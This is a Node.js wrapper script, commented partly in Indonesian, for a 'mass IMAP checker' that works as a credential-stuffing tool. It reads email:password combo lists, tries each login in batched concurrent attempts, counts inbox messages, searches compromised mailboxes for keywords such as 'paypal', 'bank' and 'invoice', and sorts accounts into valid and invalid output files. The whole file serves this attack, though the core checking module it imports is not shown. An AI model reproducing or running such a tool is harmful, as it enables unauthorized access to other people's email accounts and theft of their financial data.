const MassImapChecker = require('./mass-checker');
const path = require('path');

/**
 * Simple Mass IMAP Checker dengan keyword search
 * Usage: node simple-mass-checker.js [keyword]
 */
async function main() {
    // Ambil keyword dari command line argument
    const keyword = process.argv[2] || null;
    
    const COMBO_FILE = path.join(__dirname, 'combos.txt');
    
    // Options
    const options = {
        concurrent: 3,    // 3 accounts simultaneously  
        delay: 2000,      // 2 second delay between batches
        keyword: keyword  // Search keyword (optional)
    };
    
    console.log('🚀 SIMPLE MASS IMAP CHECKER');
    console.log('============================');
    console.log(`📁 Combo file: ${COMBO_FILE}`);
    console.log(`⚙️  Concurrent: ${options.concurrent}`);
    console.log(`⏱️  Delay: ${options.delay}ms`);
    
    if (keyword) {
        console.log(`🔍 Search keyword: "${keyword}"`);
        console.log(`📧 Mode: Login + Inbox Count + Keyword Search`);
    } else {
        console.log(`📧 Mode: Login + Inbox Count Only`);
        console.log(`💡 Tip: Add keyword as argument: node simple-mass-checker.js invoice`);
    }
    
    console.log('============================\n');
    
    const checker = new MassImapChecker();
    
    try {
        // Load combinations
        const combos = checker.loadCombos(COMBO_FILE);
        
        if (combos.length === 0) {
            console.log('❌ No valid combinations found!');
            console.log('📝 Create combos.txt with format: email:password');
            return;
        }
        
        // Start checking
        await checker.checkAllAccounts(combos, options);
        
        console.log('\n✅ All checks completed!');
        console.log('📁 Results saved in examples/results/ folder');
        
    } catch (error) {
        console.error(`❌ Error: ${error.message}`);
    }
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log('\n\n⚠️  Interrupted by user. Exiting...');
    process.exit(0);
});

// Run
main().catch(console.error);

/*
USAGE:
1. Login + inbox count only:
   node simple-mass-checker.js

2. Login + inbox count + keyword search:
   node simple-mass-checker.js invoice
   node simple-mass-checker.js paypal
   node simple-mass-checker.js bank

COMBO FILE (combos.txt):
email1@domain.com:password1
email2@domain.com:password2

OUTPUT:
- valid-accounts-TIMESTAMP.txt
- invalid-accounts-TIMESTAMP.txt  
- summary-TIMESTAMP.txt
*/
